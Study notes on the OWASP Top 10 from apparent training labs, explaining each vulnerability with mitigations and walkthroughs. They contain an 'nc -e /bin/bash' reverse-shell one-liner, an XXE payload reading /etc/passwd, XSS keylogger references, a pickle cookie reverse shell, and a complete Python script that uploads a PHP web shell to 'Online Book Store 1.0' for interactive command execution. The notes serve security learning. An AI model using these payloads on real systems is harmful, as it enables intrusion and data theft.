_OWASP rank this vulnerability as 8 out of 10 because of the following reasons_:

- Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.
- The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. For example, someone who can only cause a DoS will make the application unavailable. The business impact of this will vary on the infrastructure - some organisations will recover just fine, others, however, will not.

Breaking down each OWASP topic and including details on what the vulnerability is, how it occurs, and how you can exploit it.

- [[OWASP]]
- [[OWASP]]
- [[OWASP]]
- [[OWASP]]
- [[OWASP]]

  

- [[OWASP]]
- [[OWASP]]
- [[OWASP]][[OWASP]]
- [[OWASP]]
- [[OWASP]]

  

---

- **Injection**
    
    [[Practical Command Injection]]
    
    These flaws occur because user-controlled input is interpreted as actual commands or parameters by the application. Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies. Some common examples include:
    
    - SQL Injection occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.
    - [[OWASP]]: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.
    
    If an attacker is able to successfully pass input that is interpreted correctly, they would be able to do the following:
    
    - Access, Modify and Delete the information in a database when this input is passed into database queries. This would mean that an attacker can steal sensitive information such as personal details and credentials.
    - Execute Arbitrary system commands on a server that would allow an attacker to gain access to users’ systems. This would enable them to steal sensitive data and carry out more attacks against infrastructure linked to the server on which the command is executed.
    
    The main defense for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:
    
    - Using an allow list: when input is sent to the server, this input is compared to a list of safe input or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected and the application throws an error.
    - Stripping input: If the input contains dangerous characters, these characters are removed before they are processed.
    
    ---
    
    ### Command Injection
    
    occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.  It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.
    
    A simple `;nc -e /bin/bash`is all that's needed and they own your server
    
    [[Practical Command Injection]]
    

---

- **Broken Authentication**
    
    [**Practical Example**](https://www.notion.so/2fc662263d34475cbac97fbe755f2741?pvs=21)
    
    Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities.  
    A session cookie is needed because web servers use HTTP(S) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of users' actions.  
    If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other users’ accounts. This would allow the attacker to access sensitive data.  
    
    - Brute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts.
    - Use of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such as ‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute forcing and without multiple attempts.
    - Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts.
    
    There can be various mitigation for broken authentication mechanisms depending on the exact flaw:
    
    - To avoid password-guessing attacks, ensure the application enforces a strong password policy.
    - To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute-force attacks.
    - Implement Multi-Factor Authentication - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.
    
    ---
    
    [[Broken Authentication Practical]]
    

---

- **Sensitive Data Exposure**
    
      
    
    When a web app accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure". This is often data directly linked to customers (e.g. names, dates of birth, financial information, etc), but it could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "Man in The Middle Attack", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information
    
    - Databases support material
        
        The most common way to store a large amount of data in a format that is easily accessible from many locations at once is in a database. This is obviously perfect for something like a web application, as there may be many users interacting with the website at any one time. Database engines usually follow the Structured Query Language (SQL) syntax; however, alternative formats (such as NoSQL) are rising in popularity.
        
        In a production environment, it is common to see databases set up on dedicated servers, running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These databases are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up a full database server, and so could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.
        
        As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually, this would not be a problem for a web app, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files that a user connecting to the website is able to access)? Well, we can download it and query it on our own machine, with full access to everything in the database.
        
        ---
        
        The most common (and simplest) format of flat-file database is an _sqlite_ database. These can be interacted with in most programming languages, and have a dedicated client for querying them on the command line. This client is called "_sqlite3_", and is installed by default on Kali.
        
        Let's suppose we have successfully managed to download a database:
        
          
        
        ![[/Untitled 544.png|Untitled 544.png]]
        
          
        
        We can see that there is an SQlite database in the current folder.
        
        To access it we use: `sqlite3 <database-name>`:
        
          
        
        ![[/Untitled 1 10.png|Untitled 1 10.png]]
        
          
        
        From here we can see the tables in the database by using the `.tables`  
        command:  
        
          
        
        ![[/Untitled 2 8.png|Untitled 2 8.png]]
        
          
        
        At this point we can dump all of the data from the table, but we won't necessarily know what each column means unless we look at the table information.  
        First let's use   
        `PRAGMA table_info(customers);`to see the table information, then we'll use `SELECT * FROM customers;`to dump the information from the table:
        
          
        
        ![[/Untitled 3 8.png|Untitled 3 8.png]]
        
          
        
        We can see from the table information that there are four columns: custID, custName, creditCard and password. You may notice that this matches up with the results. Take the first row:
        
        `0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99`
        
        We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).
        
    
    ---
    
    [[Sensitive Data Exposure practical]]
    
      
    

---

- **XML External Entity**
    
    ![[/Untitled 4 8.png|Untitled 4 8.png]]
    
    An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).
    
    1) An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
    
    2) out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.
    
    ---
    
    - XML - eXtensible Markup Language
        
        **What is XML?**
        
        XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.
        
          
        
        Why we use XML?
        
        1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.
        2. 2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
        3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
        4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.
            - **Syntax**
                
                Every XML document mostly starts with what is known as XML Prolog.
                
                `<?xml version="1.0" encoding="UTF-8"?>`
                
                Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents. Every XML document must contain a `ROOT` element. For example:
                
                ```XML
                <?xml version="1.0" encoding="UTF-8"?>
                <mail> 
                <to>falcon</to>
                <from>feast</from>
                <subject>About XXE</subject>
                <text>Teach about XXE</text>
                </mail>
                ```
                
                In the above example the `<mail>` is the ROOT element of that document and `<to>`, `<from>`, `<subject>`, `<text>` are the children elements.
                
                If the XML document doesn't have any root element then it would be considered`wrong` or `invalid` XML doc.
                
                Another thing to remember is that XML is a case sensitive language. If a tag starts like `<to>` then it has to end by `</to>` and not by something like `</To>` .
                
                Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML. For example:`<text category = "message">You need to learn about XXE</text>`
                
                In the above example `category` is the attribute name and `message` is the attribute value.
                
    - DTD - Document Type Definition
        
          
        
        DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.
        
        Let us try to understand this with the help of an example.
        
        Say we have a file named `note.dtd` with the following content:
        
        `<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (\#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>`
        
        Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.
        
        Ex: Below is given an XML document that uses `note.dtd`
        
        ```XML
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE note SYSTEM "note.dtd">
        <note>
            <to>falcon</to>
            <from>feast</from>
            <heading>hacking</heading>
            <body>XXE attack</body>
        </note>
        ```
        
        So now let's understand how that DTD validates the XML. Here's what all those terms used in `note.dtd` mean
        
        - !DOCTYPE note - Defines a root element of the document named note
        - !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
        - !ELEMENT to - Defines the `to` element to be of type "\#PCDATA"
        - !ELEMENT from - Defines the `from` element to be of type "\#PCDATA"
        - !ELEMENT heading - Defines the `heading` element to be of type "\#PCDATA"
        - !ELEMENT body - Defines the `body` element to be of type "\#PCDATA"
        
        NOTE: \#PCDATA means parseable character data.
        
          
        
    - XXE Payload
        
        Now we'll see some XXE payload and see how they are working.
        
        1) The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.
        
        ```XML
        <!DOCTYPE replace [<!ENTITY name "feast"> ]>
         <userInfo>
          <firstName>falcon</firstName>
          <lastName>&name;</lastName>
         </userInfo>
        ```
        
        As we can see we are defining a `ENTITY` called `name` and assigning it a value `feast`. Later we are using that ENTITY in our code.
        
        2) We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword
        
        ```XML
        <?xml version="1.0"?>
        <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
        <root>&read;</root>
        ```
        
        Here again, we are defining an ENTITY with the name `read` but the difference is that we are setting it value to `SYSTEM` and path of the file.If we use this payload then a website vulnerable to XXE(normally) would display the content of the file `/etc/passwd`.
        
        In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.
        
    
    ---
    
    [[Exploiting practical]]
    
      
    

---

- **Broken Access Control**
    
    ![[/Untitled 5 7.png|Untitled 5 7.png]]
    
    Websites have pages that are protected from regular visitors, for example only the site's admin user should be able to access a page to manage other users. If a website visitor is able to access the protected page/pages that they are not authorised to view, the access controls are broken.
    
    A regular visitor being able to access protected pages, can lead to the following:
    
    - Being able to view sensitive information
    - Accessing unauthorized functionality
    
      
    
    OWASP have a listed a few attack scenarios demonstrating access control weaknesses:
    
    Scenario \#1: The application uses unverified data in a SQL call that is accessing account information:
    
    ```SQL
    pstmt.setString(1, request.getParameter("acct"));
    
    ResultSet results = pstmt.executeQuery( );
    ```
    
    An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
    
    http://example.com/app/accountInfo?acct=notmyacct
    
      
    
    Scenario \#2: An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
    
    http://example.com/app/getappInfo
    
    http://example.com/app/admin_getappInfo
    
      
    
    If an unauthenticated user can access either page, it’s a flaw. If a non-admin can access the admin page, this is a flaw.
    
    To put simply, broken access control allows attackers to bypass authorization which can allow them to view sensitive data or perform tasks as if they were a privileged user.
    
    - IDOR - Insecure Direct Object Reference
        
        ![[/Untitled 6 6.png|Untitled 6 6.png]]
        
        IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.
        
        For example, let's say we're logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this 
        
        `https://example.com/bank?account_number=1234`.
        
        On that page we can see all our important bank details, and a user would do whatever they needed to do and move along their way thinking nothing is wrong.
        
        There is however a potentially huge problem here, a hacker may be able to change the account_number parameter to something else like 1235, and if the site is incorrectly configured, then he would have access to someone else's bank information.
        
        [[IDOR Practical]]
        
          
        

---

- **Security Misconfiguration**
    
    Security Misconfigurations are distinct from the other Top 10 vulnerabilities, because they occur when security could have been configured properly but was not.
    
    Security misconfigurations include:
    
    - Poorly configured permissions on cloud services, like S3 buckets
    - Having unnecessary features enabled, like services, pages, accounts or privileges
    - Default accounts with unchanged passwords
    - Error messages that are overly detailed and allow an attacker to find out more about the system
    - Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/), or revealing too much detail in the Server: HTTP header
    
    This vulnerability can often lead to more vulnerabilities, such as default credentials giving you access to sensitive data, XXE or command injection on admin pages.
    
    For more info, I recommend having a look at the [OWASP top 10 entry for Security Misconfiguration](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration)
    
      
    
    ## **Default Passwords**
    
    Specifically, this VM focusses on default passwords. These are a specific example of a security misconfiguration. You could, and should, change any default passwords but people often don't.
    
    It's particularly common in embedded and Internet of Things devices, and much of the time the owners don't change these passwords.
    
    It's easy to imagine the risk of default credentials from an attacker's point of view. Being able to gain access to admin dashboards, services designed for system administrators or manufacturers, or even network infrastructure could be incredibly useful in attacking a business. From data exposure to easy RCE, the effects of default credentials can be severe.
    
    In October 2016, Dyn (a DNS provider) was taken offline by one of the most memorable DDoS attacks of the past 10 years. The flood of traffic came mostly from Internet of Things and networking devices like routers and modems, infected by the Mirai malware.
    
    How did the malware take over the systems? Default passwords. The malware had a list of 63 username/password pairs, and attempted to log in to exposed telnet services.
    
    The DDoS attack was notable because it took many large websites and services offline. Amazon, Twitter, Netflix, GitHub, Xbox Live, PlayStation Network, and many more services went offline for several hours in 3 waves of DDoS attacks on Dyn.
    
    [[Default Password Practical]]
    

---

- **Cross-site Scripting**
    
    Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.
    
    A web application is vulnerable to XSS if it uses unsanitized user input. XSS is possible in Javascript, VBScript, Flash and CSS. There are three main types of cross-site scripting:
    
    1. Stored XSS - the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
    2. Reflected XSS - the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
    3. DOM-Based XSS - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.
    
    ---
    
    - XSS Payloads
        
        Remember, cross-site scripting is a vulnerability that can be exploited to execute malicious Javascript on a victim’s machine. Check out some common payloads types used:
        
        - Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
        - Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
        - XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
        - Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner.
        
        XSS-Payloads.com (http://www.xss-payloads.com/) is a website that has XSS related Payloads, Tools, Documentation and more. You can download XSS payloads that take snapshots from a webcam or even get a more capable port and network scanner.
        
    
    [[XSS Practical]]
    

---

- **Insecure Deserialization**
    
    _"Insecure Deserialization is a vulnerability which occurs when untrusted data is used to abuse the logic of an application" (Acunetix., 2017)_
    
    This definition is still quite broad to say the least. Simply, insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario.
    
    Specifically, this malicious code leverages the legitimate serialization and deserialization process used by web applications.
    
      
    
    _OWASP rank this vulnerability as 8 out of 10 because of the following reasons_:
    
    - Low exploitability. This vulnerability is often a case-by-case basis - there is no reliable tool/framework for it. Because of its nature, attackers need to have a good understanding of the inner-workings of the ToE.
    - The exploit is only as dangerous as the attacker's skill permits, more so, the value of the data that is exposed. For example, someone who can only cause a DoS will make the application unavailable. The business impact of this will vary on the infrastructure - some organisations will recover just fine, others, however, will not.
    
    **What's Vulnerable?**
    
    At summary, ultimately, any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained. A few examples of applications of this nature are:
    
    - E-Commerce Sites
    - Forums
    - API's
    - Application Runtimes (Tomcat, Jenkins, Jboss, etc)
    
    ---
    
    - Insecure Deserialization - Objects
        
        A prominent element of object-oriented programming (OOP), objects are made up of two things:
        
        - State
        - Behaviour
        
        Simply, objects allow you to create similar lines of code without having to do the leg-work of writing the same lines of code again.
        
          
        
        For example, a lamp would be a good object. Lamps can have different types of bulbs, this would be their state, as well as being either on/off this being their behaviour.
        
        Rather than having to accommodate every type of bulb and whether or not that specific lamp is on or off, you can use methods to simply alter the state and behaviour of the lamp.
        
    - Insecure Deserialization - Deserialization
        
        **De(Serialization)**
        
        ---
        
        A Tourist approaches you in the street asking for directions. They're looking for a local landmark and got lost. Unfortunately, English isn't their strong point and nor do you speak their dialect either. What do you do? You draw a map of the route to the landmark because pictures cross language barriers, they were able to find the landmark. Nice! You've just serialised some information, where the tourist then deserialised it to find the landmark.
        
        **Continued**
        
        ---
        
        Serialisation is the process of converting objects used in programming into simpler, compatible formatting for transmitting between systems or networks for further processing or storage.
        
        Alternatively, deserialisation is the reverse of this; converting serialised information into their complex form - an object that the application will understand.
        
        **What does this mean?**
        
        ---
        
        Say you have a password of "password123" from a program that needs to be stored in a database on another system. To travel across a network this string/output needs to be converted to binary. Of course, the password needs to be stored as "password123" and not its binary notation. Once this reaches the database, it is converted or deserialised back into "password123" so it can be stored.
        
        ![[/Untitled 7 6.png|Untitled 7 6.png]]
        
        ---
        
        **How can we leverage this?**
        
        Simply, insecure deserialization occurs when data from an untrusted party (I.e. a hacker) gets executed because there is no filtering or input validation; the system assumes that the data is trustworthy and will execute it no holds barred.
        
          
        
    - Insecure Deserialization - Cookies
        
        ![[/Untitled 8 6.png|Untitled 8 6.png]]
        
        Cookies are an essential tool for modern websites to function. Tiny pieces of data, these are created by a website and stored on the user's computer.
        
        Cookies are not permanent storage solutions like databases. Some cookies such as session ID's will clear when the browser is closed, others, however, last considerably longer. This is determined by the "Expiry" timer that is set when the cookie is created.
        
          
        
        _Some cookies have additional attributes, a small list of these are below:_
        
        |Attribute|Description|Required?|
        |---|---|---|
        |Cookie Name|The Name of the Cookie to be set|Yes|
        |Cookie Value|Value, this can be anything plaintext or encoded|Yes|
        |Secure Only|If set, this cookie will only be set over HTTPS connections|No|
        |Expiry|Set a timestamp where the cookie will be removed from the browser|No|
        |Path|The cookie will only be sent if the specified URL is within the request|No|
        
        ---
        
        - Insecure Deserialization - Cookies Practical
            
            ![[/Untitled 9 5.png|Untitled 9 5.png]]
            
            I’ll create an account
            
            ![[/Untitled 10 4.png|Untitled 10 4.png]]
            
            Once logged in
            
            ![[/Untitled 11 4.png|Untitled 11 4.png]]
            
            If i inspect the storage of the webpage
            
            ![[/Untitled 12 4.png|Untitled 12 4.png]]
            
            The password is encoded as plaintext, and i can see sessionId base64 encoded and some userType Cookie
            
            Decoding the base64 i found
            
            ![[/Untitled 13 4.png|Untitled 13 4.png]]
            
            So if i change the userType cookie to **admin** that means i’m an admin?
            
            ![[/Untitled 14 4.png|Untitled 14 4.png]]
            
            Yes, now i own an admins account.
            
        - Insecure Deserialization - Code Execution
            
            Looking through cookies i found one that is generated by clicking “Exchange your VIM”
            
            ![[/Untitled 15 4.png|Untitled 15 4.png]]
            
            This is the snippet that creates the cookie
            
            ![[/Untitled 16 4.png|Untitled 16 4.png]]
            
            And this is how the cookie is retrieved or deserialized, as i can see the cookie is just being decoded, without cheeking if its safe.
            
            ![[/Untitled 17 4.png|Untitled 17 4.png]]
            
            This vulnerability exploits Python Pickle. We essentially have free reign to execute whatever we like such as a reverse shell.
            
              
            
            So using this code that encodes some Python code to use sys lib and os calls
            
            ![[/Untitled 18 4.png|Untitled 18 4.png]]
            
            Executing the code it leaves with de b64 encoded
            
            ![[/Untitled 19 4.png|Untitled 19 4.png]]
            
            Now i change the cookie **encodedPayload** to use my encoded b64
            
            ![[/Untitled 20 4.png|Untitled 20 4.png]]
            
            Done! Reverse shell established
            
            ![[/Untitled 21 4.png|Untitled 21 4.png]]
            
              
            

---

- **Components with Known Vulnerabilities**
    
    Occasionally, you may find that the company/entity that you're pen-testing is using a program that already has a well documented vulnerability.
    
    For example, let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on [exploit-db](https://www.exploit-db.com/exploits/41962).
    
    As you can see this would be quite devastating, because it requires very little work on the part of the attacker as often times since the vulnerability is already well known, someone else has made an exploit for the vulnerability. The situation becomes even worse when you realize, that it's really quite easy for this to happen, if a company misses a single update for a program they use, they could be vulnerable to any number of attacks.
    
    Hence, why OWASP has rated this a 3(meaning high) on the prevalence scale, it is incredibly easy for a company to miss an update for an application.
    
    ---
    
    - Exploit
        
        Recall that since this is about known vulnerabilities, most of the work has already been done for us. Our main job is to find out the information of the software and research it until we can find an exploit. Let's go through that with an example web application.
        
        ![[/Untitled 22 4.png|Untitled 22 4.png]]
        
        What do you know, this server is using the default page for the nostromo web server. Now that we have a version number and a software name, we can use [exploit-db](https://www.exploit-db.com/)  
         to try and find an exploit for this particular version.  
        
        ![[/Untitled 23 3.png|Untitled 23 3.png]]
        
        It may not work the first time. It helps to have an understanding of the programming language that the script is in, so that if needed you can fix any bugs or make any modifications, as quite a few scripts on exploit-db expect you to make modifications.
        
        ![[/Untitled 24 3.png|Untitled 24 3.png]]
        
        Fortunately for us, the error was caused by a line that should have been commented on, so it's an easy fix.
        
        ![[/Untitled 25 3.png|Untitled 25 3.png]]
        
        Fixing that, let's try and rerun the program.
        
        We have RCE. Now it's important to note here that most scripts will just tell you what arguments you need to provide, exploit developers will rarely make you read potentially hundreds of lines of codes just to figure out how to use the script.
        
        It is also worth noting that it may not always be this easy, sometimes you will just be given a version number like in this case, but other times you may need to dig through the HTML source, or even take a lucky guess on an exploit script, but realistically if it is a known vulnerability, there's probably a way to discover what version the application is running.
        
        That's really it, the great thing about this piece of the OWASP 10, is that the work is pretty much already done for us, we just need to do some basic research, and as a penetration tester, you're already doing that quite a bit :).
        
    - Lab
        
        The following is a vulnerable application, all information you need to exploit it can be found online.
        
        ![[/Untitled 26 3.png|Untitled 26 3.png]]
        
        ---
        
        So the index of this site already gives me some information. This is a template from projectworlds and has a Admin Panel
        
        ![[/Untitled 27 3.png|Untitled 27 3.png]]
        
        ![[/Untitled 28 3.png|Untitled 28 3.png]]
        
        And looking through the project page we have default information like DB directory and admin credentials
        
        ![[/Untitled 29 3.png|Untitled 29 3.png]]
        
        Searching for /database i founded
        
        ![[/Untitled 30 3.png|Untitled 30 3.png]]
        
        So looking in exploitdb it looks like there is an exploit for ‘**Online Book Store 1.0’** and theres place for Unauthenticated RCE
        
        ![[/Untitled 31 3.png|Untitled 31 3.png]]
        
        The exploit its fairly simple.
        
        It basicaly tries uploading a file with the payload being a shell_exec in a php snippet
        
        ```Python
        import argparse
        import random
        import requests
        import string
        import sys
        
        parser = argparse.ArgumentParser()
        parser.add_argument('url', action='store', help='The URL of the target.')
        args = parser.parse_args()
        
        url = args.url.rstrip('/')
        random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))
        
        payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'
        
        file = {'image': (random_file + '.php', payload, 'text/php')}
        print('> Attempting to upload PHP web shell...')
        r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
        print('> Verifying shell upload...')
        r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)
        
        if random_file in r.text:
            print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
            print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
            launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
            if launch_shell.lower() == 'y':
                while True:
                    cmd = str(input('RCE $ '))
                    if cmd == 'exit':
                        sys.exit(0)
                    r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
                    print(r.text)
        else:
            if r.status_code == 200:
                print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
            else:
                print('> Web shell failed to upload! The web server may not have write permissions.')
        ```
        
          
        

---

- **Insufficient Logging & Monitoring**
    
    When web applications are set up, every action performed by the user should be logged. Logging is important because in the event of an incident, the attackers actions can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions an attacker performed if they gain access to particular web applications. The bigger impacts of these include:
    
    - Regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, not only are users of the application affected, but the application owners may be subject to fines or more severe actions depending on regulations.
    - Risk of further attacks: without logging, the presence of an attacker may be undetected. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.
    
    The information stored in logs should include:
    
    - HTTP status codes
    - Time Stamps
    - Usernames
    - API endpoints/page locations
    - IP addresses
    
    These logs do have some sensitive information on them so its important to ensure that logs are stored securely and multiple copies of these logs are stored at different locations.
    
    As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is having monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity includes:
    
    - multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources e.g. admin pages)
    - requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
    - use of automated tools: particular automated tooling can be easily identifiable e.g. using the value of User-Agent headers or the speed of requests. This can indicate an attacker is using automated tooling.
    - common payloads: in web applications, it's common for attackers to use Cross Site Scripting (XSS) payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.
    
    Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will higher impact than others. These higher impact actions need to be responded to sooner thus they should raise an alarm which raises the attention of the relevant party.